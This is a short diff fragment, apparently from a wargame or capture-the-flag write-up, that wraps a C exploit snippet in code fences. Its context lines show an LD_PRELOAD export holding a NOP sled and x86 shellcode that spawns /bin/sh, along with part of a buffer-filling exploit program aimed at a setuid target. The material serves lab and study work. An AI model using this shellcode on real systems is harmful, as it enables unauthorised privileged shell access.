@@ -299,6 +299,7 @@ SETUID + /BIN/SH
 
 export LD_PRELOAD=`python -c 'print "/home/skeleton/"+ "\x90" *100 +"\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -329,3 +330,5 @@ main(int argc, char *argv[])
         memset(buffer+40+8, 'A', 4);
 }
 
+
+```
